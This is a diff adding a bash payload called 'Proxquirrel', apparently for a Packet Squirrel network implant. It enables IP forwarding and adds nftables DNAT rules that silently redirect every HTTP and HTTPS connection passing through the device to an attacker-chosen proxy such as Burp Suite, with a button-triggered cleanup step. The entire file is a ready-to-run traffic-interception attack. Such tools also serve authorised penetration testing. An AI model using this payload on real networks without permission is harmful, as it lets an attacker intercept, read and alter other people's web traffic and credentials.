@@ -1,0 +1,59 @@
+#!/bin/bash
+
+# Title:        Proxquirrel
+# Author:       0i41E
+#
+# Description: A payload to route web traffic to a defined Proxy, like BurpSuite.
+#
+# Usage: Setup a HTTP proxy like Burp, accessible for the Squirrel and define it under line 17 & 18
+
+# Set Network mode 
+NETMODE NAT
+SSH_STOP
+UI_STOP
+
+LED STAGE3
+sleep 2
+
+# Define HTTP proxy below
+PROXY_ADDRESS="0.0.0.0" # Proxy Address
+PROXY_PORT="8080" # Proxy Port
+# Optional to change
+TARGET_PORTS="80, 443" # Intercepted Web Ports
+RULE_NAME="Proxquirrel"
+RETRY=5 # Seconds between connection attempts 
+
+# Enable IPv4 forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Loop until the proxy is reachable
+while true; do
+    if nc -z -w5 "$PROXY_ADDRESS" "$PROXY_PORT"; then
+        LED Y SOLID
+        sleep 2
+        
+        # Create a nft ruleset to redirect traffic from ports defined in TARGET_PORTS
+        nft add table ip $RULE_NAME
+        nft -- add chain ip $RULE_NAME prerouting { type nat hook prerouting priority -100 \; }
+        nft add rule ip $RULE_NAME prerouting tcp dport { $TARGET_PORTS } dnat to $PROXY_ADDRESS:$PROXY_PORT
+
+        LED FINISH
+        sleep 3
+
+        # Cleanup, when BUTTON is pressed
+        NO_LED=1 BUTTON
+
+        LED CLEANUP
+        sleep 3
+
+        # Delete the table when BUTTON is pressed, to revert changes
+        nft delete table ip $RULE_NAME
+
+        LED B SOLID
+        break
+    else
+    	# Retry in X seconds
+        LED FAIL2
+        sleep $RETRY
+    fi
+done
